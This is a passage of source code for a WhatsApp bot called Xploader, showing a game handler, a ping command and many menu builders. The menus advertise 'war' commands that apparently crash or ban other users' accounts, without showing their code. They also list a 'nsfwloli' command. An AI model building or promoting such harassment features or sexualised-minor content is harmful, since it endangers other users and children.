      let reg = /^(scissors|rock|paper)/i;
      if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
        roof.pilih = reg.exec(m.text.toLowerCase())[0];
        roof.text = m.text;
        reply(
          `_You have chosen_ ${m.text} ${
            !roof.pilih2 ? `\n\n*_Waiting for the opponent to choose_*` : ""
          }`
        );
        if (!roof.pilih2)
          Xploader.sendText(
            roof.p2,
            "_The opponent has chosen_\nNow it is your turn",
            0
          );
      }
      if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
        roof.pilih2 = reg.exec(m.text.toLowerCase())[0];
        roof.text2 = m.text;
        reply(
          `_You have chosen_ ${m.text} ${
            !roof.pilih ? `\n\n*_Waiting for the opponent to choose_*` : ""
          }`
        );
        if (!roof.pilih)
          Xploader.sendText(
            roof.p,
            "_The opponent has chosen_\nNow it is your turn",
            0
          );
      }
      let stage = roof.pilih;
      let stage2 = roof.pilih2;
      if (roof.pilih && roof.pilih2) {
        clearTimeout(roof.waktu_milih);
        if (b.test(stage) && g.test(stage2)) win = roof.p;
        else if (b.test(stage) && k.test(stage2)) win = roof.p2;
        else if (g.test(stage) && k.test(stage2)) win = roof.p;
        else if (g.test(stage) && b.test(stage2)) win = roof.p2;
        else if (k.test(stage) && b.test(stage2)) win = roof.p;
        else if (k.test(stage) && g.test(stage2)) win = roof.p2;
        else if (stage == stage2) tie = true;
        Xploader.sendText(
          roof.asal,
          `_*Game Result*_${tie ? "\nTIE" : ""}

@${roof.p.split`@`[0]} (${roof.text}) ${
            tie ? "" : roof.p == win ? ` Win \n` : ` Lost \n`
          }
@${roof.p2.split`@`[0]} (${roof.text2}) ${
            tie ? "" : roof.p2 == win ? ` Win \n` : ` Lost  \n`
          }
`.trim(),
          m,
          { mentions: [roof.p, roof.p2] }
        );
        delete this.suit[roof.id];
      }
    } //end
    //user db
    if (isCommand && !isUser) {
      XpBotUser.push(sender);
      fs.writeFileSync(
        "./src/data/role/user.json",
        JSON.stringify(XpBotUser, null, 2)
      );
    }

    switch (isCommand) {
//=====OWNER MENU CMDS===========================//   
        case "ping":
        case "p":
        {
let themimgst = [tylorkid, tylorkid1, tylorkid3, tylorkid4, tylorkid5]
let randomIndex = Math.floor(Math.random() * themimgst.length)
let themingst = themimgst[randomIndex]
          const used = process.memoryUsage();
         const quoteXpBot = await axios.get(`https://favqs.com/api/qotd`);
          const cpus = os.cpus().map((cpu) => {
            cpu.total = Object.keys(cpu.times).reduce(
              (last, type) => last + cpu.times[type],
              0
            );
            return cpu;
          });
          const cpu = cpus.reduce(
            (last, cpu, _, { length }) => {
              last.total += cpu.total;
              last.speed += cpu.speed / length;
              last.times.user += cpu.times.user;
              last.times.nice += cpu.times.nice;
              last.times.sys += cpu.times.sys;
              last.times.idle += cpu.times.idle;
              last.times.irq += cpu.times.irq;
              return last;
            },
            {
              speed: 0,
              total: 0,
              times: {
                user: 0,
                nice: 0,
                sys: 0,
                idle: 0,
                irq: 0,
              },
            }
          );
          let timestamp = speed();
          let latensi = speed() - timestamp;
          neww = performance.now();
          oldd = performance.now();
          let latencySeconds = latensi.toFixed(4);
          let latencyMs = oldd - neww;
          let totalLatencyMs = Math.round(latencySeconds * 1000 + latencyMs);
          let finalStatus =
            `*Quote of the day:*\n\n_${quoteXpBot.data.quote.body}_ \n\n> ©𝐗𝐩𝐥𝐨𝐚𝐝𝐞𝐫𝐁𝐨𝐭 `.trim();
await Xploader.sendMessage(m.chat, {
                    text: finalStatus, 
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `𝗦𝗣𝗘𝗘𝗗: ${totalLatencyMs} 𝐦𝐬`, 
                            body: `𝗨𝗣𝗧𝗜𝗠𝗘: ${runtime( process.uptime())}`,
                            thumbnail: themingst,
                            sourceUrl: `https://www.instagram.com/heyits_tylor?igsh=YzljYTk1ODg3Zg==`,
                            mediaType: 1,
                            renderLargerThumbnail: false
                        }
                    }
                }, {
                    quoted: m
                })
            }
        break;   
//=================================================//   
      case "menu":
        {
let themimgs = [tylorkid, tylorkid1, tylorkid3, tylorkid4, tylorkid5]
let randomIndex = Math.floor(Math.random() * themimgs.length)
let themings = themimgs[randomIndex]
          let ownernya = ownernumber + "@s.whatsapp.net";
          let timestampe = speed();
          let latensie = speed() - timestampe;
          let a = db.data.users[sender];
          let me = m.sender;
          let xpbotz = `┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *sᴘᴇᴇᴅ* :  ${latensie.toFixed(4)} ms
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣ 
${readmore}
┏▣ ◊ 𝗠𝗘𝗡𝗨 ◊
│□ ${prefix}allmenu
│□ ${prefix}downloadmenu
│□ ${prefix}funmenu
│□ ${prefix}aimenu
│□ ${prefix}groupmenu
│□ ${prefix}ownermenu
│□ ${prefix}animemenu
│□ ${prefix}ephoto360menu
│□  ${prefix}stalkermenu
│□ ${prefix}othermenu
│□ ${prefix}makermenu
│□ ${prefix}reactionmenu
│□ ${prefix}nsfwmenu
┗▣ `;
if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: themings,
                        caption: xpbotz
                    }, {
                        quoted: m
                    })
} else if (typemenu === 'v2') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xpbotz
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : themings}, { upload: Xploader.waUploadToServer})), 
                  title: ``,
                  gifPlayback: false,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"SCRIPT\",\"url\":\"https://github.com/Dark-Xploit/XPLOADER-BOT/fork\",\"merchant_url\":\"https://www.google.com\"}"
              },       
                                  ],
                }),
                contextInfo: {
                externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await Xploader.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
}  
}
break;
//=================================================//
case "allmenu":
          let ownernya = ownernumber + "@s.whatsapp.net";
          let timestampe = speed();
          let latensie = speed() - timestampe;
          let xmenu_am = `┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *sᴘᴇᴇᴅ* :  ${latensie.toFixed(4)} ms
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣ 
${readmore}
┏▣ ◊ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ◊
│□ autoread
│□ autobio
│□ autotype
│□ autorecord
│□ autorecordtyping
│□ offline 
│□ autostatusview 
│□ setautoblock
│□ setantiforeign
│□ autoblock
│□ onlygc
│□ onlypc
│□ mode
│□ public 
│□ private 
│□ join
│□ leave
│□ block
│□ unblock 
│□ anticall
│□ broadcast 
│□ menutype
│□ setreply
│□ setprefix
│□ resethit
│□ resetuser
│□ creategroup
│□ setbio
│□ setprofilepic
│□ delprofilepic
│□ restart 
│□ addlimit
│□ dellimit
│□ addpremium
│□ delpremium
│□ addowner
│□ delowner
│□ posttextstatus
│□ postaudiostatus
│□ postvideostatus
│□ getsession
│□ delsession 
│□ pushcontact
│□ request 
│□ reportbug
│□ ipbot
│□ listowner
│□ listpremium
│□ setfullpp
│□ getcase
│□ delete
┗▣ 


┏▣ ◊ 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨 ◊
│□ antibot
│□ antipoll
│□ antiviewonce
│□ antilinkgc
│□ antisticker
│□ antidocument
│□ antiaudio
│□ antivideo
│□ antivirus
│□ antimedia
│□ antiimage 
│□ anticontact
│□ antiforeign
│□ tagadmin
│□ welcome
│□ listonline
│□ adminevent
│□ groupevent
│□ grouplink
│□ invite
│□ add
│□ kick
│□ promote
│□ demote 
│□ ephemeral
│□ setppgroup
│□ delppgroup
│□ setdesc
│□ opentime
│□ closetime
│□ getcontact
│□ savecontact
│□ sendcontact
│□ contacttag
│□ totag
│□ hidetag
│□ tagall
│□ resetlink
│□ editinfo
│□ react
│□ setgroupname
│□ getbio
│□ userjid
│□ groupmode 
│□ nsfw
│□ poll
┗▣ 


┏▣ ◊ 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨 ◊
│□ play
│□ playdoc
│□ video
│□ videodoc
│□ ytsearch
│□ ytmp3
│□ ytmp4
│□ shazam
│□ gitclone
│□ facebook
│□ tiktok
│□ apk
│□ telesticker
│□ imdb
│□ wanumber
│□ ringtone
│□ pinterest
│□ itunes
│□ image
│□ instagram
│□ happymod
┗▣ 


┏▣ ◊ 𝗔𝗜 𝗠𝗘𝗡𝗨 ◊
│□ gpt
│□ gpt2
│□ gemini
│□ openai
│□ gptgo
│□ blackbox
│□ bardai
│□ bingai
│□ dalle
│□ imagen
│□ photoai
│□ generate
│□ simi
│□ llama
│□ turbo
│□ aidetector
┗▣ 


┏▣ ◊ 𝗘𝗣𝗛𝗢𝗧𝗢360 𝗠𝗘𝗡𝗨 ◊
│□ glitchtext
│□ graffiti 
│□ sand
│□ matrix 
│□ deadpool
│□ dragonball
│□ incandescent 
│□ topography
│□ writetext
│□ advancedglow
│□ typographytext
│□ deletingtext
│□ pixelglitch
│□ flagtext
│□ flag3dtext
│□ neonglitch
│□ logomaker
│□ blackpinkstyle
│□ underwatertext
│□ glowingtext
│□ cartoonstyle
│□ blackpinklogo
│□ effectclouds
│□ watercolortext
│□ papercutstyle
│□ gradienttext
│□ summerbeach
│□ makingneon
│□ multicoloredneon
│□ sandsummer
│□ 1917style
│□ galaxywallpaper
│□ freecreate
│□ royaltext
│□ luxurygold
│□ lighteffects
│□ galaxystyle
┗▣ 


┏▣ ◊ 𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨 ◊
│□ ping
│□ take
│□ pairid
│□ pairfile
│□ sticker
│□ uptime
│□ script
│□ owner
│□ toimage
│□ tovideo
│□ toaudio
│□ tovn
│□ tomp3
│□ togif
│□ smeme
│□ shortlink
│□ calculate
│□ tourl
│□ smeme
│□ define
│□ remini
│□ emojimix
│□ toviewonce
│□ totalcmds
│□ menu
│□ obfuscate
│□ fancy
│□ Bible
│□ Quran
│□ fliptext
│□ toqr
│□ volaudio
│□ volvideo
│□ bass 
│□ blown
│□ deep
│□ earrape
│□ fast
│□ fat
│□ nightcore
│□ reverse
│□ robot
│□ slow
│□ smooth
│□ squirrel
│□ tts
│□ translate
│□ lyrics
│□ ssweb
│□ sswebpc
│□ sswebtab
┗▣ 


┏▣ ◊ 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨 ◊
│□ truthdetector
│□ mathsquiz
│□ rockpaperscissors
│□ tictactoe
│□ deltictactoe
│□ xxqc
│□ randomgirl
│□ randomboy
│□ rate
│□ soulmate 
│□ couple 
│□ wallpaper 
│□ wikimedia 
│□ pick
│□ fact 
│□ quotes
│□ truth
│□ dare
│□ checkme
│□charactercheck
│□ stupidcheck
│□ uncleancheck
│□ hotcheck
│□ smartcheck
│□ evilcheck
│□ dogcheck
│□ coolcheck
│□ waifucheck
│□ handsomecheck
│□ beautifulcheck
│□ awesomecheck
│□ cutecheck
│□ gaycheck
│□ greatcheck
│□ lesbiancheck
│□ hornycheck
│□ prettycheck
│□ lovelycheck
│□ uglycheck
│□ lovesticker
┗▣ 


┏▣ ◊ 𝗥𝗘𝗔𝗧𝗜𝗢𝗡 𝗠𝗘𝗡𝗨 ◊
│□ cry
│□ kill
│□ hug
│□ pat
│□ lick
│□ kiss
│□ bite
│□ yeet
│□ bully 
│□ bonk
│□ wink
│□ poke
│□ nom
│□ slap
│□ smile
│□ wave
│□ awoo
│□ blush
│□ smug
│□ glomp 
│□ happy
│□ dance
│□ cringe
│□ cuddle
│□ highfive
│□ handhold
│□ shinobu
│□ woof
│□ 8ball
│□ goose 
│□ gecg
│□ feed
│□ avatar 
│□ foxgirl
│□ lizard
│□ spank
│□ meow
│□ tickle
┗▣ 


┏▣ ◊ 𝗠𝗔𝗞𝗘𝗥 𝗠𝗘𝗡𝗨 ◊
│□ ttp
│□ attp
┗▣ 


┏▣ ◊ 𝗔𝗡𝗜𝗠𝗘 𝗠𝗘𝗡𝗨 ◊
│□ anime
│□ animeawoo
│□ animemegumin
│□ animeshinobu
│□ animehandhold
│□ animehighfive
│□ animecringe
│□ animedance
│□ animehappy
│□ animeglomp
│□ animesmug
│□ animeblush
│□ animewave
│□ animesmile
│□ animepoke
│□ animewink
│□ animebonk
│□ animebully
│□ animeyeet
│□ animebite
│□ animelick
│□ animekill
│□ animecry
│□ animewallpaper
│□ animekiss 
│□ animehug
│□ animeneko
│□ animepat
│□ animeslap
│□ animecuddle
│□ animewaifu
│□ animenom
│□ animefoxgirl
│□ animetickle
│□ animegecg
│□ dogwoof
│□ 8ballpool
│□ goosebird
│□ animefeed
│□ animeavatar
│□ lizardpic
│□ catmeow
│□ animequote
┗▣ 


┏▣ ◊ 𝗪𝗔𝗥 𝗠𝗘𝗡𝗨 ◊
│□ xpkill
│□ xpload-ios
│□ xpload-andro
│□ spampair
│□ tempban 
┗▣ 


┏▣ ◊ 𝗡𝗦𝗙𝗪 𝗠𝗘𝗡𝗨 ◊
│□ hentai
│□ trap
│□ neko
│□ waifu
│□ gasm
│□ milf
│□ animespank
│□ hentaivideo
│□ ahegao
│□ ass
│□ bdsm
│□ blowjob
│□ cuckold
│□ cum
│□ eba
│□ ero
│□ foot
│□ femdom
│□ glasses
│□ gangbang
│□ jahy
│□ manga
│□ masturbation
│□ neko-hentai
│□ neko-hentai2
│□ nsfwloli
│□ orgy
│□ panties
│□ pussy
│□ tentacles
│□ thighs
│□ yuri
│□ zettai
│□ gifblowjob
│□ gifhentai
┗▣ `;
 if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_am
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_am,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
//=================================================//
case "ownermenu":
          let xmenu_ty = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣ 
${readmore}
┏▣ ◊ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ◊
│□ autoread
│□ autobio
│□ autotype
│□ autorecord
│□ autorecordtyping
│□ offline 
│□ autostatusview 
│□ setautoblock
│□ setantiforeign
│□ autoblock
│□ onlygc
│□ onlypc
│□ mode
│□ public 
│□ private 
│□ join
│□ leave
│□ block
│□ unblock 
│□ anticall
│□ broadcast 
│□ menutype 
│□ setreply
│□ setprefix
│□ resethit
│□ resetuser
│□ creategroup
│□ setbio
│□ setprofilepic
│□ delprofilepic
│□ restart 
│□ addlimit
│□ dellimit
│□ addpremium
│□ delpremium
│□ addowner
│□ delowner
│□ posttextstatus
│□ postaudiostatus
│□ postvideostatus
│□ getsession
│□ delsession 
│□ pushcontact
│□ request 
│□ reportbug
│□ ipbot
│□ listowner
│□ listpremium
│□ setfullpp
│□ getcase
│□ delete
┗▣ `;
 if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_ty
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_ty,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
//=================================================//
case "groupmenu":
          let xmenu_gc = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣ 
${readmore}
┏▣ ◊ 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨 ◊
│□ antibot
│□ antipoll
│□ antiviewonce
│□ antilinkgc
│□ antisticker
│□ antidocument
│□ antiaudio
│□ antivideo
│□ antivirus
│□ antimedia
│□ antiimage 
│□ anticontact
│□ antiforeign
│□ tagadmin
│□ welcome
│□ listonline
│□ adminevent
│□ groupevent
│□ grouplink
│□ invite
│□ add
│□ kick
│□ promote
│□ demote 
│□ ephemeral
│□ setppgroup
│□ delppgroup
│□ setdesc
│□ opentime
│□ closetime
│□ getcontact
│□ savecontact
│□ sendcontact
│□ contacttag
│□ totag
│□ hidetag
│□ tagall
│□ resetlink
│□ editinfo
│□ react
│□ setgroupname
│□ getbio
│□ userjid
│□ groupmode 
│□ nsfw
│□ poll
┗▣ `;
if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_gc
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_gc,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
 //=================================================//
 case "downloadmenu":
           let xmenu_dl = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣ 
${readmore}
┏◊ ◊ 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 𝗠𝗘𝗡𝗨 ◊
│□ play
│□ playdoc
│□ video
│□ videodoc
│□ ytsearch
│□ ytmp3
│□ ytmp4
│□ shazam
│□ gitclone
│□ facebook
│□ tiktok
│□ apk
│□ telesticker
│□ imdb
│□ wanumber
│□ ringtone
│□ pinterest
│□ itunes
│□ image
│□ instagram
│□ happymod
┗▣ `;
if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_dl
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_dl,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
 //=================================================//
 case "ephoto360menu":
            let xmenu_ep = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣ 
${readmore}
┏▣ ◊ 𝗘𝗣𝗛𝗢𝗧𝗢360 𝗠𝗘𝗡𝗨 ◊
│□ glitchtext
│□ graffiti 
│□ sand
│□ matrix 
│□ deadpool
│□ dragonball
│□ incandescent 
│□ topography
│□ writetext
│□ advancedglow
│□ typographytext
│□ deletingtext
│□ pixelglitch
│□ flagtext
│□ flag3dtext
│□ neonglitch
│□ logomaker
│□ blackpinkstyle
│□ underwatertext
│□ glowingtext
│□ cartoonstyle
│□ blackpinklogo
│□ effectclouds
│□ watercolortext
│□ papercutstyle
│□ gradienttext
│□ summerbeach
│□ makingneon
│□ multicoloredneon
│□ sandsummer
│□ 1917style
│□ galaxywallpaper
│□ freecreate
│□ royaltext
│□ luxurygold
│□ lighteffects
│□ galaxystyle
┗▣ `;
 if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_ep
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_ep,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
 //=================================================//
 case "aimenu":
             let xmenu_ai = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣ 
${readmore}
┏▣ ◊ 𝗔𝗜 𝗠𝗘𝗡𝗨 ◊
│□ gpt
│□ gpt2
│□ gemini
│□ openai
│□ gptgo
│□ blackbox
│□ bardai
│□ bingai
│□ dalle
│□ imagen
│□ photoai
│□ generate
│□ simi
│□ llama
│□ turbo
│□ aidetector
┗▣ `;
if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_ai
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_ai,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
 //=================================================//
 case "othermenu":
              let xmenu_om = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣ 
${readmore}
┏▣ ◊ 𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨 ◊
│□ ping
│□ take
│□ pairid
│□ pairfile
│□ sticker
│□ uptime
│□ script
│□ owner
│□ toimage
│□ tovideo
│□ toaudio
│□ tovn
│□ tomp3
│□ togif
│□ smeme
│□ shortlink
│□ calculate
│□ tourl
│□ smeme
│□ define
│□ remini
│□ emojimix
│□ toviewonce
│□ totalcmds
│□ menu
│□ obfuscate
│□ fancy
│□ Bible
│□ Quran
│□ fliptext
│□ toqr
│□ volaudio
│□ volvideo
│□ bass 
│□ blown
│□ deep
│□ earrape
│□ fast
│□ fat
│□ nightcore
│□ reverse
│□ robot
│□ slow
│□ smooth
│□ squirrel
│□ tts
│□ translate
│□ lyrics
│□ ssweb
│□ sswebpc
│□ sswebtab
┗▣ `;
if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_om
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_om,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              { quoted: fstatus });
          }
        break;
 //=================================================//
 case "funmenu":
               let xmenu_fm = `
┏▣ ◊ 𝗫𝗣𝗟𝗢𝗔𝗗𝗘𝗥 ◊
┃ *ᴏᴡɴᴇʀ* :  ${ownername}
┃ *ᴘʀᴇғɪx* :  [ ${prefix} ]
┃ *ʜᴏsᴛ* : ${os.platform()}
┃ *ᴘʟᴜɢɪɴs* : 501
┃ *ᴍᴏᴅᴇ* : ${Xploader.public ? "Public" : `Private`}
┃ *ᴠᴇʀsɪᴏɴ* : 2.5.0
┃ *ʀᴀᴍ* :  ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
┗▣ 
${readmore}
┏▣ ◊ 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨 ◊
│□ truthdetector
│□ mathsquiz
│□ rockpaperscissors
│□ tictactoe
│□ deltictactoe
│□ xxqc
│□ randomgirl
│□ randomboy
│□ rate
│□ soulmate 
│□ couple 
│□ wallpaper 
│□ wikimedia 
│□ pick
│□ fact 
│□ quotes
│□ truth
│□ dare
│□ checkme
│□charactercheck
│□ stupidcheck
│□ uncleancheck
│□ hotcheck
│□ smartcheck
│□ evilcheck
│□ dogcheck
│□ coolcheck
│□ waifucheck
│□ handsomecheck
│□ beautifulcheck
│□ awesomecheck
│□ cutecheck
│□ gaycheck
│□ greatcheck
│□ lesbiancheck
│□ hornycheck
│□ prettycheck
│□ lovelycheck
│□ uglycheck
│□ lovesticker
┗▣ `;
if (typemenu === 'v1') {
                    Xploader.sendMessage(m.chat, {
                        image: tylorkid5,
                        caption: xmenu_fm
                    }, {
                        quoted: m
                    })
           }  else if (typemenu === 'v2') {
Xploader.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: xmenu_fm,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: tylorkid,
